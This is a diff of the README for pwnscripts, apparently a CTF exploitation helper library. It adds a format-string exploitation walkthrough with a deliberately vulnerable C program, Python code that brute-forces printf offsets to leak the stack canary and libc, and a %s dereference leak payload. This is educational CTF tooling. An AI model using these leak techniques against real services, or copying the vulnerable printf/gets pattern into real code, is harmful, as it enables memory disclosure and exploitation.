@@ -1,4 +1,4 @@
-# pwnscripts
+# pwnscripts (dev-0.5.1)
 [![Tests](https://github.com/152334H/pwnscripts/workflows/Python%20package/badge.svg)](https://github.com/152334H/pwnscripts/actions)
 [![PyPI package](https://badge.fury.io/py/pwnscripts.svg)](https://pypi.org/project/pwnscripts/)
 [![Python](https://img.shields.io/pypi/pyversions/pwnscripts)](https://www.python.org/downloads/)
@@ -102,29 +102,73 @@ You're free to shut up the interactive menu by giving `.select_gadget()` an argu
 More features exist, but this is already too long.
 
 ### Format string exploitation
-pwnscripts provides the `fsb` module, which can be split further into:
-  * `.find_offset`: helper functions to bruteforce wanted printf offsets.
+`printf()` challenges are repetitive. Under the `fsb` module, `pwnscripts` makes an attempt to further abstract the process of `printf()` exploitation.
 
-    If you've ever found yourself spamming `%n$llx` into a terminal: this module will automate away all that. Take a look at the [example code](test_automated.py) to see how.
+Consider this simple program:
+```c
+//usr/bin/gcc -pie -fstack-protector-all -z,relro,-z,now "$0" -o test.o; exit
+int main(){
+  char s[200];
+  fgets(s, 199, stdin);
+  printf(s);   // leaker
+  gets(s+200); // overflow
+}
+```
+Let's further assume that you've decided to exploit this by returning to libc with the buffer overflow present. `printf()` can leak the runtime values of the [stack canary](https://ctf101.org/binary-exploitation/stack-canaries/) && [libc page](#Libc), but only after figuring out the specific stack offset (i.e. figuring out _m_ for `%m$p`) for both of those values.
 
-    This already partially exists as a feature in pwntools (see `pwnlib.fmtstr.FmtStr`), but pwnscripts expands functionality by having bruteforcers for other important printf offsets, including
-    1. `canary`s, for defeating stack protectors,
-    2. `stack` addresses, to make leaking a stack pointer much easier,
-    3. other things like `code` addresses with more niche purposes
-  * `.leak`: a simple two-function module to make leaking values with `%s` a lot easier.
+Similar to the `FmtStr()` class in pwntools, we'll start by setting up a python function to abstract away the i/o associated with this challenge in particular:
+```python
+>>> @context.quiet
+... def printf(line: str) -> bytes:
+...   r = context.binary.process()
+...   r.send(line)
+...   return r.recvline() # return the output of printf()
+```
+With this function, We can automate the process of offset identification with `fsb.leak_offset`:
+```python
+>>> context.binary = './test.o'
+>>> context.log_level = 'debug' # demonstration
+>>> canary_offset = fsb.find_offset.canary(printf)
+[DEBUG] cache is at ~/.cache/.pwntools-cache-3.8/fsb-cache/07e93d243fc1a7d88432cfb25bdc8bbb7b65fcabd6bb96ccea9c1ad027f2039f-default
+[DEBUG] pwnscripts: extracted 0x7c
+[DEBUG] pwnscripts: extracted 0x4141414141414141
+... (omitted log) ...
+[DEBUG] pwnscripts: extracted 0xcd088451e013aa00
+[*] pwnscripts.fsb.find_offset for 'canary': 31
+```
+With the canary found, we can move on to leaking libc. Since `__libc_start_main_ret` is located immediately after the canary in the stack, the `printf()` cache maintained by `fsb.find_offset` will speed things up immensely:
+```python
+>>> context.libc_database = '../libc-database'       # replace with yours
+>>> context.libc = '/lib/x86_64-linux-gnu/libc.so.6' # ibid
+>>> libc_offset = fsb.find_offset.libc(printf,
+... offset=context.libc.symbols['__libc_start_main_ret']&0xfff)  # Specify that we're looking for a value matching __l_s_m_r
+[DEBUG] cache is at /home/throwaway/.cache/.pwntools-cache-3.8/fsb-cache/07e93d243fc1a7d88432cfb25bdc8bbb7b65fcabd6bb96ccea9c1ad027f2039f-default
+(cached) [DEBUG] pwnscripts: extracted 0x7c
+(cached) [DEBUG] pwnscripts: extracted 0x4141414141414141
+... (omitted cache log) ...
+(cached) [DEBUG] pwnscripts: extracted 0x3ad0d999e654b800
+[DEBUG] pwnscripts: extracted 0x0
+[DEBUG] pwnscripts: extracted 0x7f17857870b3
+[*] pwnscripts.fsb.find_offset for 'libc': 33
+```
+More examples can be found [here](test_automated.py) and [here](user_tests_and_examples.py).
 
-    The simple idea is that you get a payload to leak printf values:
-    ```python
-    offset = fsb.find_offset.buffer(...) # == 6
-    payload = fsb.leak.deref_payload(offset, [0x400123, 0x600123])
-    print(payload)  # b'^^%10$s||%11$s$$#\x01@\x00#\x01`\x00'
-    ```
-    And after sending the payload, extract the values with a helper function:
-    ```python
-    r = remote(...)
-    r.sendline(payload)
-    print(fsb.leak.deref_extractor(r.recvline()))  # [b'\x80N\x03p\x94\x7f', b' \xeb\x04p\x94\x7f']
-    ```
+---
+
+Apart from offset bruteforcing, `pwnscripts.fsb` also contains a `.leak` submodule to make leaking values with `%s` more programmatic.
+
+The simple idea is that you get a payload to leak printf values:
+```python
+offset = fsb.find_offset.buffer(...) # == 6
+payload = fsb.leak.deref_payload(offset, [0x400123, 0x600123])
+print(payload)  # b'^^%10$s||%11$s$$#\x01@\x00#\x01`\x00'
+```
+And after sending the payload, extract the values with a helper function:
+```python
+r = remote(...)
+r.sendline(payload)
+print(fsb.leak.deref_extractor(r.recvline()))  # [b'\x80N\x03p\x94\x7f', b' \xeb\x04p\x94\x7f']
+```
 ### Minor features
 Pwnscripts also comes with a few minor extensions and functions:
 * `ROP`: an extension of `pwnlib.rop.rop.ROP`. Core feature is to simplify ROP building outside of SIGROP:
